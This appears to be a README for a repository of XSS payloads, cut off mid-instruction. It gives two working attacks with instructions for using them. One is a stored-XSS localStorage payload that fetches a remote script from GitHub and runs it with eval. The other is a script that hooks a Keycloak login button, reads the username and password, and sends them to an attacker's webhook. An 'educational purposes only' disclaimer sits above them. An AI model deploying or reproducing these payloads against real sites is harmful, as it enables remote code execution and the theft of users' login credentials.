# ðŸš¨ XSS Payloads & Exploits 

Warning : This project is for educational purposes only. The author cannot be held responsible for any misuse or illegal use of the scripts in this repository.

## Content

### 1. localstorage.js

```javascript
localStorage.setItem('userName', `"><img src=x onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/XSS/refs/heads/main/localstorage.js').then(r=>r.text()).then(c=>eval(c))">`);
```

âœ… What it does

This payload injects a malicious img tag with an onerror handler that dynamically loads and executes the content of localstorage.js from your GitHub repository.

âœ… Purpose

Demonstrates stored XSS via localStorage.
Creates a persistent XSS that executes every time the application reads the stored value and renders it unsanitized.

âœ… How to use

Inject this payload into a vulnerable input field that stores its value in localStorage and outputs it in the DOM without proper escaping.

### 2. chargebutton.js

```javascript
var btn = document.getElementById('kc-login');

if (btn) {
    btn.onclick = function() {
        var passwordInput = document.getElementById('password');
        if (passwordInput) {
            passwordInput.type = 'text';
        }
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        new Image().src = '<WEBHOOK_URL>/?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password);
    };
}
```

âœ… What it does

Hooks into a login button (kc-login), intercepts the login action, reveals the password, and sends both username and password to your webhook.

âœ… Purpose

Exfiltrates credentials from login forms.
Can be loaded via XSS to steal credentials without user awareness.

âœ… How to use

Replace <WEBHOOK_URL> with your controlled endpoint (e.g., webhook.site, Discord, or custom server).
Inject the following payload to load the script dynamically:
